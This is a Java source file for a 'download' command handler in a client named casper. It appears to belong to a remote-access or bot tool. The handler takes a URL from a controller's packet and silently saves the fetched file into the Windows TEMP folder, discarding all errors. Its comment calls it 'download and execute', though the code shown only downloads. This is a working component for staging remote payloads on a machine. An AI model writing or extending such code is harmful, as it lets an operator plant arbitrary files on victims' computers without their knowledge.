package casper.client.commands.impl;

import casper.client.Client;
import casper.client.commands.Action;
import casper.client.commands.Command;
import casper.client.script.Browser;
import casper.net.Packet;
import casper.net.json.JSONArray;
import casper.net.json.JSONException;

import java.io.File;
import java.io.FileOutputStream;
import java.net.URL;
import java.nio.channels.Channels;
import java.nio.channels.ReadableByteChannel;

/**
 * A basic download and execute function for the client.
 *
 * @author Aazim
 * @version 1.0
 */
@Command("download")
public class Download implements Action {

    public void execute(Client client, Packet p) throws JSONException {
        JSONArray params = p.readJSONArray();
        try {
            final String link = params.getString(0);
            final URL url = new URL(link);
            final Browser browser = new Browser(url);
            ReadableByteChannel r = Channels.newChannel(browser.getInputSteam());
            File file = new File(System.getenv("TEMP") + "\\" + link.substring(link.lastIndexOf("/") + 1));
            if (!file.exists() && !file.createNewFile()) return;
            FileOutputStream fos = new FileOutputStream(file);
            fos.getChannel().transferFrom(r, 0, 1 << 24);
            fos.close();
        } catch (Exception ignored) {

        }
    }
}
